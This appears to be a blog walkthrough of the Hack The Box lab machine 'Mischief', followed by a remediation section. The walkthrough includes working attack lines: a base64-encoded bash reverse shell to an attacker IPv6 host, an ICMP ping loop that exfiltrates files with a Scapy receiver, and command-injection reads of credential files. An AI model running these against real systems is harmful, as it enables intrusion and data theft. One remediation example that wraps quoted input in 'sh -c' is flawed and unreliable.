---
title: "Mischief HTB - Insane Linux Box Walkthrough"
date: 2025-09-22T09:30:00Z
tags: ["insane-linux", "snmp", "ipv6", "command-injection", "web", "ssh", "privilege-escalation", "icmp", "firewall", "bypass", "enumeration"]
difficulty: ["insane"]
categories: ["HTB", "Linux"]
draft: false
description: "Complete walkthrough of Mischief HTB machine featuring SNMP enumeration for IPv6 discovery, command injection exploitation with blacklist bypass, IPv6 firewall misconfiguration abuse, and ICMP exfiltration techniques"
---

# Mischief HTB - Insane Linux Box Walkthrough

{{< youtube GKo6xoB1g4Q >}}

## Key Exploitation Steps and Techniques

Here are the key exploitation steps and techniques from the provided data, presented in chronological order:

1. **Initial Reconnaissance with Nmap**:
   - **Technique**: Run Nmap with default scripts (`-sC`) and version enumeration (`-sV`) on the target IP (`[TARGET-IP]`).
   - **Details**: Identified port 22 (SSH) open, running OpenSSH 7.6p1 on Ubuntu 4, published in 2018. SSH exploits were deemed unlikely due to the recent version, and brute-forcing was avoided to prevent account lockouts or detection.
   - **Command**: `nmap -sC -sV -oA nmap/mischief [TARGET-IP]`

2. **UDP Scan for Additional Services**:
   - **Technique**: Perform a UDP scan with Nmap (`-sU`) to identify additional open ports.
   - **Details**: Discovered port 161 (SNMP) open, indicating potential for SNMP enumeration.
   - **Command**: `nmap -sU -v -oA nmap/mischief-udp [TARGET-IP]`

3. **Full TCP Port Scan**:
   - **Technique**: Scan all 65,535 TCP ports to ensure no services were missed.
   - **Details**: Identified port 3366 open, running a simple HTTP server.
   - **Command**: `nmap -p- -v --max-retries 0 -oA nmap/mischief-tcp-all [TARGET-IP]`

4. **SNMP Enumeration**:
   - **Technique**: Use `snmpwalk` with the default community string "public" and SNMP version 2c to gather system information.
   - **Details**: Retrieved extensive system information, including an IPv6 address in decimal format, processes, and the command line for the simple HTTP server on port 3366, revealing credentials (`loki:godofmischiefis@loki`).
   - **Commands**:
     - `snmpwalk -c public -v2c [TARGET-IP]`
     - Install SNMP MIBs for readable output: `apt install snmp-mibs-downloader`
     - Updated `snmpwalk` with MIBs: `snmpwalk -c public -v2c [TARGET-IP]`

5. **Brute-Forcing SNMP Community Strings (if needed)**:
   - **Technique**: Use the `onesixtyone` tool to brute-force SNMP community strings if "public" fails.
   - **Details**: Confirmed "public" worked, but demonstrated updating `onesixtyone` from GitHub to use a community string wordlist.
   - **Commands**:
     - `onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt [TARGET-IP]`
     - Update tool: `cd /opt; git clone <trailofbits/onesixtyone>; ./onesixtyone -c <wordlist> [TARGET-IP]`

6. **Accessing the Simple HTTP Server (IPv4, Port 3366)**:
   - **Technique**: Access the HTTP server on port 3366, encountering a basic authentication prompt.
   - **Details**: Used credentials from SNMP output (`loki:godofmischiefis@loki`). Retrieved an image and new credentials (`loki:trickeryanddeceit`).
   - **Steps**:
     - Navigate to `http://[TARGET-IP]:3366`
     - Login with `loki:godofmischiefis@loki`
     - Check image for steganography (none found using `exiftool` and `binwalk`)

7. **IPv6 Address Conversion and Scanning**:
   - **Technique**: Convert the decimal IPv6 address from SNMP to hexadecimal format and scan it.
   - **Details**: Used Python to convert decimal to hex (e.g., `print(hex(222))` for `0xde`), forming the IPv6 address `dead:beef::/64`. Scanned with Nmap to find port 80 open (Apache) on IPv6, unlike port 3366 on IPv4.
   - **Commands**:
     - `nmap -sC -sV -oA nmap/mischief-ipv6 -6 dead:beef::`
     - Verify port 3366 closed on IPv6: `nc -zv -6 dead:beef:: 3366`

8. **Command Injection on IPv6 Web Server (Port 80)**:
   - **Technique**: Access the Apache server on IPv6, log in, and exploit a command injection vulnerability.
   - **Details**: Logged in with `administrator:trickeryanddeceit` (guessed username). Executed commands via a web panel, confirming command injection with `ping` and `sleep` tests. Discovered blacklisted commands (e.g., `cat`, `ls`, `credentials`) but bypassed using wildcards (e.g., `cred*`).
   - **Steps**:
     - Navigate to `http://[dead:beef::]`
     - Login with `administrator:trickeryanddeceit`
     - Test command injection: `ping [ATTACKER-IP]; echo`, `sleep 5; echo`
     - Retrieve credentials: `cat /home/loki/cred*; echo` → `lokiisthebestnorsegod`

9. **SSH Access as Loki**:
   - **Technique**: Use credentials obtained from command injection to SSH into the target as the `loki` user.
   - **Details**: Logged in with `loki:lokiisthebestnorsegod`, confirming user-level access.
   - **Command**: `ssh loki@[TARGET-IP]`

10. **Privilege Escalation Attempt (Unsuccessful)**:
    - **Technique**: Check for privilege escalation vectors, including `sudo`, group memberships, and file permissions.
    - **Details**: Found `loki` not in the `lxc` group, no `sudo` access, and restricted permissions on `/bin/su`. Checked `.bash_history` for additional credentials (`loki:trickeryanddeceitgodofmischiefis@loki`), but `su` failed.
    - **Commands**:
      - `groups`, `sudo -l`, `ls -la /bin/su`, `getfacl /bin/su`
      - `cat ~/.bash_history`

11. **Reverse Shell via IPv6 (Unintended Solution)**:
    - **Technique**: Exploit an IPv6 firewall misconfiguration (iptables blocks IPv4, but `ip6tables` is open) to establish a reverse shell.
    - **Details**: Used the command injection panel to send a base64-encoded reverse shell command over IPv6 to bypass blacklisted commands (`nc`). Set up a Netcat listener on the attacker's IPv6 address (`dead:beef::`) and executed the shell.
    - **Commands**:
      - Attacker: `nc -lvnp -6 9001`
      - Command injection: `echo -n "bash -i >& /dev/tcp/dead:beef::/9001 0>&1" | base64 -w0 | { echo; base64 -d | sh; }`
      - Result: Shell as `www-data`

12. **Privilege Escalation to Root**:
    - **Technique**: From the `www-data` shell, access Loki's `.bash_history` for credentials and switch to root.
    - **Details**: Retrieved `loki:trickeryanddeceitgodofmischiefis@loki` from `.bash_history`, then used `su` to escalate to root.
    - **Commands**:
      - `cat /home/loki/.bash_history`
      - `su -` with `trickeryanddeceitgodofmischiefis@loki`

13. **Locating the Flag**:
    - **Technique**: Search for the flag file using `find` with a modified time filter.
    - **Details**: Found the flag in `/usr/lib/gcc/x86_64-linux-gnu/7/root.txt` (33 bytes, matching the user flag length) after searching for files modified after May 15, 2018.
    - **Commands**:
      - `find / -newer /etc/passwd -type f 2>/dev/null`
      - `wc -c /usr/lib/gcc/x86_64-linux-gnu/7/root.txt`

14. **Intended Solution (ICMP Exfiltration)**:
    - **Technique**: Exfiltrate files using ICMP packets to read data, avoiding the IPv6 reverse shell.
    - **Details**: Used `ping` with the `-p` option to embed file contents (up to 16 bytes per packet) in ICMP packets. Captured packets with `tcpdump` and extracted data using a Python script with Scapy.
    - **Commands**:
      - Command injection: `while read line; do ping -p $line -c 1 [ATTACKER-IP]; done < /home/loki/cred`
      - Attacker: `tcpdump -i tun0 -w icmp.out icmp`
      - Python script:
        ```python
        from scapy.all import *
        def process_packet(packet):
            if packet.haslayer(ICMP) and packet[ICMP].type == 8:
                data = packet[ICMP].load[-4:].decode('utf-8')
                print(data, end='', flush=True)
        sniff(iface='tun0', prn=process_packet)
        ```
    - **Outcome**: Successfully read `/home/loki/cred` and `/etc/passwd` line-by-line via ICMP.

15. **ICMP Shell (Challenge)**:
    - **Technique**: Suggested creating a full ICMP shell for interactive access as root to locate the flag.
    - **Details**: Not implemented in the walkthrough but recommended searching GitHub for ICMP shell scripts to upload and execute on the target.

**Notes**:
- The unintended solution exploited an `ip6tables` misconfiguration, allowing an IPv6 reverse shell, which significantly simplified the box compared to the intended ICMP-based approach.
- The command injection vulnerability was critical, with blacklisted command bypasses (e.g., `fi?n?d`, `cred*`) enabling further exploitation.
- SNMP provided critical initial information (IPv6 address, credentials), highlighting its importance in reconnaissance.

## Security Gaps and Remediation

Below is a list of identified gaps (vulnerabilities or misconfigurations) in the services and systems described in the provided data, along with proposed fixes categorized by whether they require a source code fix or a configuration fix. Each gap corresponds to a specific service or system component from the "Mischief" Hack The Box walkthrough.

### 1. **SNMP Service (Port 161/UDP)**
   - **Gap**: Default community string "public" allows unauthenticated access to sensitive system information (e.g., IPv6 address, running processes, and command-line arguments including credentials).
   - **Impact**: Attackers can enumerate system details, credentials, and network configurations, enabling further exploitation.
   - **Fix Type**: Configuration Fix
   - **Proposed Fix**:
     - **Change Community String**: Replace the default "public" community string with a strong, unique string to prevent unauthorized access.
       - Configuration: Edit `/etc/snmp/snmpd.conf` to set a custom community string (e.g., `rocommunity my_secure_string`).
     - **Restrict Access**: Configure SNMP to allow connections only from specific IP addresses or subnets.
       - Configuration: Add `agentaddress 127.0.0.1,<trusted_ip>` in `/etc/snmp/snmpd.conf` to bind SNMP to specific interfaces or IPs.
     - **Use SNMPv3**: Switch to SNMPv3, which supports authentication and encryption, to secure data transmission.
       - Configuration: Configure SNMPv3 with `authPriv` mode, requiring a username, authentication password, and encryption key.
     - **Limit Exposed Data**: Reduce the amount of information exposed via SNMP by restricting MIBs (Management Information Bases).
       - Configuration: Modify `view` directives in `/etc/snmp/snmpd.conf` to exclude sensitive OIDs (e.g., process tables, network interfaces).

### 2. **Simple HTTP Server (Port 3366/TCP, IPv4)**
   - **Gap**: Credentials for the HTTP server (`loki:godofmischiefis@loki`) are exposed via SNMP process enumeration, and the server uses weak basic authentication.
   - **Impact**: Attackers can access the server and retrieve sensitive data (e.g., an image and additional credentials) without significant effort.
   - **Fix Type**: Configuration Fix
   - **Proposed Fix**:
     - **Secure Credentials**: Avoid storing or exposing credentials in process command-line arguments.
       - Configuration: Use environment variables or a configuration file with restricted permissions (e.g., `chmod 600 /etc/httpd.conf`) to store credentials.
     - **Strong Authentication**: Replace basic authentication with stronger mechanisms (e.g., OAuth, token-based authentication) or enforce complex passwords.
       - Configuration: Update the HTTP server configuration to use a secure authentication module (e.g., for Python's `http.server`, integrate with a proper auth framework).
     - **Network Restriction**: Restrict access to the HTTP server to specific IPs or subnets.
       - Configuration: Configure the server to bind to a specific interface (e.g., `127.0.0.1:3366`) or use a firewall rule (e.g., `iptables -A INPUT -p tcp --dport 3366 -s <trusted_ip> -j ACCEPT`).

### 3. **Apache Web Server (Port 80/TCP, IPv6)**
   - **Gap**: The web server allows command injection via a web panel, with a weak username (`administrator`) and guessable password (`trickeryanddeceit`).
   - **Impact**: Attackers can execute arbitrary commands as the `www-data` user, leading to system compromise.
   - **Fix Type**: Source Code Fix
   - **Proposed Fix**:
     - **Sanitize Input**: Implement strict input validation and sanitization to prevent command injection.
       - Code Change: Modify the web application code to use parameterized commands or a secure API instead of passing user input directly to `system()` or similar functions. For example, in PHP:
         ```php
         // Instead of: system($_POST['command']);
         // Use: $allowed_commands = ['ping', 'sleep']; if (in_array($_POST['command'], $allowed_commands)) { system(escapeshellcmd($_POST['command'])); }
         ```
     - **Use Prepared Statements**: If the application involves dynamic command execution, use libraries that prevent injection (e.g., Python's `subprocess.run` with proper argument escaping).
     - **Escape Shell Commands**: Use functions like `escapeshellarg()` or `escapeshellcmd()` to sanitize inputs before passing to shell commands.
       - Example: In Python, replace `os.system(user_input)` with `subprocess.run(['sh', '-c', shlex.quote(user_input)])`.

   - **Gap**: Blacklist-based command filtering (e.g., blocking `cat`, `ls`, `credentials`) is easily bypassed using wildcards (e.g., `cred*`, `fi?n?d`).
   - **Impact**: Attackers can bypass restrictions to execute sensitive commands or access restricted files.
   - **Fix Type**: Source Code Fix
   - **Proposed Fix**:
     - **Switch to Whitelist**: Replace blacklist-based filtering with a whitelist of allowed commands and parameters.
       - Code Change: Define a strict list of permitted commands and reject any input that doesn't match.
         ```php
         $whitelist = ['ping', 'whoami', 'sleep'];
         if (!in_array($command, $whitelist)) {
             die("Command not allowed");
         }
         ```
     - **Regular Expression Validation**: Use regex to enforce strict command patterns, rejecting any input with wildcards or special characters unless explicitly allowed.
       - Example: `preg_match('/^[a-zA-Z0-9]+$/', $command)` in PHP to allow only alphanumeric commands.

   - **Gap**: Weak authentication allows guessing the `administrator` username with a known password.
   - **Impact**: Attackers can access the command execution panel with minimal effort.
   - **Fix Type**: Configuration Fix
   - **Proposed Fix**:
     - **Enforce Strong Credentials**: Require complex usernames and passwords, and implement account lockout policies after failed attempts.
       - Configuration: Update the Apache authentication configuration (e.g., `.htpasswd`) with strong, hashed passwords and integrate with a PAM module for lockout policies.
     - **Multi-Factor Authentication (MFA)**: Add MFA to the login process to increase security.
       - Configuration: Integrate an MFA module like `mod_authn_otp` for Apache.

### 4. **IPv6 Firewall Misconfiguration (ip6tables)**
   - **Gap**: The `ip6tables` firewall is wide open, allowing outbound IPv6 connections, while `iptables` (IPv4) blocks all outbound traffic.
   - **Impact**: Attackers can establish reverse shells over IPv6, bypassing the intended ICMP-based solution.
   - **Fix Type**: Configuration Fix
   - **Proposed Fix**:
     - **Mirror IPv4 Rules in IPv6**: Configure `ip6tables` to match the restrictive `iptables` rules, blocking all outbound connections except those explicitly allowed.
       - Configuration:
         ```bash
         ip6tables -P OUTPUT DROP
         ip6tables -A OUTPUT -p tcp --dport <allowed_port> -j ACCEPT
         ip6tables -A OUTPUT -p udp --dport <allowed_port> -j ACCEPT
         ```
     - **Disable IPv6 if Unnecessary**: If IPv6 is not required, disable it entirely to reduce the attack surface.
       - Configuration: Add `ipv6.disable=1` to the kernel boot parameters in `/etc/default/grub` and run `update-grub`.
     - **Monitor IPv6 Traffic**: Enable logging for IPv6 traffic to detect unauthorized connections.
       - Configuration: `ip6tables -A OUTPUT -j LOG --log-prefix "IPv6_OUT: "`

### 5. **SSH Service (Port 22/TCP)**
   - **Gap**: Weak credentials (`loki:lokiisthebestnorsegod`) allow SSH access.
   - **Impact**: Attackers can gain user-level access to the system.
   - **Fix Type**: Configuration Fix
   - **Proposed Fix**:
     - **Enforce Strong Passwords**: Implement a password policy requiring complex passwords (e.g., minimum length, mixed characters).
       - Configuration: Edit `/etc/security/pwquality.conf` to set password requirements (e.g., `minlen=12`, `dcredit=-1`, `ucredit=-1`).
     - **Use Key-Based Authentication**: Disable password-based SSH authentication and require SSH keys.
       - Configuration: In `/etc/ssh/sshd_config`, set `PasswordAuthentication no` and ensure `PubkeyAuthentication yes`.
     - **Restrict SSH Access**: Limit SSH access to specific IPs or networks.
       - Configuration: In `/etc/ssh/sshd_config`, add `AllowUsers loki@<trusted_ip>` or use `iptables`/`ip6tables` rules to restrict access.

### 6. **System Permissions and User Configuration**
   - **Gap**: Sensitive credentials are stored in plain text in `/home/loki/.bash_history`, accessible to the `www-data` user.
   - **Impact**: Attackers with `www-data` access can retrieve credentials for privilege escalation.
   - **Fix Type**: Configuration Fix
   - **Proposed Fix**:
     - **Secure .bash_history**: Restrict permissions on `.bash_history` to prevent access by non-owners.
       - Configuration: `chmod 600 /home/loki/.bash_history`
     - **Disable History for Sensitive Commands**: Prevent sensitive commands (e.g., those containing passwords) from being logged.
       - Configuration: Set `HISTCONTROL=ignorespace` in `/home/loki/.bashrc` and prefix sensitive commands with a space.
     - **Clear .bash_history Regularly**: Implement a cron job to clear or rotate `.bash_history` to minimize exposure.
       - Configuration: Add a cron job: `0 0 * * * truncate -s 0 /home/loki/.bash_history`.

   - **Gap**: The `loki` user has restricted permissions on `/bin/su`, preventing direct execution, but the `www-data` user can escalate to root using credentials from `.bash_history`.
   - **Impact**: Misconfigured permissions allow unintended privilege escalation.
   - **Fix Type**: Configuration Fix
   - **Proposed Fix**:
     - **Correct su Permissions**: Ensure only authorized users or groups can execute `/bin/su`.
       - Configuration: `chmod 750 /bin/su; chown root:root /bin/su`
     - **Restrict www-data Access**: Limit the `www-data` user's access to sensitive directories (e.g., `/home/loki`).
       - Configuration: `chmod 750 /home/loki; chown loki:loki /home/loki`

### 7. **Command Execution Output Handling**
   - **Gap**: The command injection panel unintentionally leaks command output due to improper piping to `/dev/null` (e.g., `command; echo` reveals output of `command`).
   - **Impact**: Attackers can retrieve sensitive data (e.g., file contents) that should be suppressed.
   - **Fix Type**: Source Code Fix
   - **Proposed Fix**:
     - **Fix Output Suppression**: Ensure all command output is properly redirected to `/dev/null` or suppressed.
       - Code Change: Modify the command execution logic to redirect both stdout and stderr to `/dev/null`:
         ```php
         // Instead of: system("$command > /dev/null");
         // Use: system("$command > /dev/null 2>&1");
         ```
     - **Log Errors Securely**: If errors need to be logged, use a secure logging mechanism that doesn't expose output to the user.
       - Example: In Python, use `subprocess.run` with `stdout=DEVNULL`, `stderr=DEVNULL`.

### 8. **General System Hardening**
   - **Gap**: Lack of comprehensive firewall rules and network segmentation allows unrestricted access to services.
   - **Impact**: Attackers can access services (e.g., SNMP, HTTP) from any IP, increasing the attack surface.
   - **Fix Type**: Configuration Fix
   - **Proposed Fix**:
     - **Implement Network Segmentation**: Use VLANs or network namespaces to isolate services.
       - Configuration: Configure network interfaces with `ip link` and `vconfig` to create VLANs, or use `iptables`/`ip6tables` to restrict access.
     - **Apply Principle of Least Privilege**: Ensure services run with minimal permissions (e.g., `www-data` should not access user home directories).
       - Configuration: Use `AppArmor` or `SELinux` to confine services like Apache and Simple HTTP Server.

### Summary of Fix Types
- **Source Code Fixes**: Address command injection vulnerabilities and improper output handling in the Apache web application.
- **Configuration Fixes**: Secure SNMP, SSH, HTTP servers, firewall rules, and file permissions to prevent unauthorized access and escalation.

These fixes address the specific vulnerabilities exploited in the walkthrough, ensuring the system is hardened against similar attacks. For additional security, regular patching, monitoring, and auditing (e.g., using `fail2ban` for SSH brute-force protection) should be implemented.

## Conclusion

Mischief is an excellent machine that demonstrates the importance of comprehensive network enumeration and the dangers of IPv6 security oversights. It requires expertise in:
- SNMP enumeration and information gathering techniques
- IPv6 networking and dual-stack security considerations
- Command injection exploitation and blacklist bypass methods
- Firewall misconfiguration identification and exploitation
- ICMP-based data exfiltration techniques
- Creative privilege escalation through credential discovery

The machine emphasizes the critical importance of securing all network protocols (IPv4 and IPv6), properly configuring firewalls across all IP versions, implementing strong authentication mechanisms, and avoiding information disclosure through system services.

---

*This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.*